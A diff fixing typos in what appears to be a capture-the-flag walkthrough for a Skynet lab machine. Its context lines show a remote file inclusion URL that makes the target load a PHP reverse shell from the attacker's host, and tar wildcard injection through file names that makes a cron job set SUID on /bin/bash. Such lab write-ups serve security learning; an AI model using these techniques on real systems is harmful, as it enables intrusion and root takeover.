@@ -531,7 +531,7 @@ After checking how the exploit works, i found that we can **inject PHP code** on
 
 We can host a **PHP Reverse Shell** and make the server interpret the file by using the following path `http://<TARGET-IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<LOCAL-IP>/shell.php`.
 
-So let's start hosting the **PHP Reverse Shell**,if we are using **Kali** or **Parrot**  we can find the classic [Monkey Pentester PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) at `/usr/share/webshells/laudanum/php/php-reverse-shell.php`, so let's copy it to our current directory.
+So let's start hosting the **PHP Reverse Shell**, if we are using **Kali** or **Parrot**  we can find the classic [Monkey Pentester PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) at `/usr/share/webshells/laudanum/php/php-reverse-shell.php`, so let's copy it to our current directory.
 
 ```bash
 cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .
@@ -669,7 +669,7 @@ What we have left to do is create the `privesc.sh` script to generate a way to g
 chmod u+s /bin/bash
 ```
 
-This will add **GUID** perms to the `bash` binary.
+This will add **SUID** perms to the `bash` binary.
 
 Now let's see what will happen when the cron job executes the script `backup.sh`, we just created files named as `tar` arguments.
 
@@ -687,7 +687,7 @@ tar cf /home/milesdyson/backups/backup.tgz --checkpoint-action=exec=sh privesc.s
 
 Here you should see more clearly how it works, we are adding argumentes via file names.
 
-Then once the cron job executes `backup.sh` again we should see that `/bin/bash` is flagged as **GUID**.
+Then once the cron job executes `backup.sh` again we should see that `/bin/bash` is flagged as **SUID**.
 
 ```bash
 www-data@skynet:/var/www/html$ ls -l /bin/bash
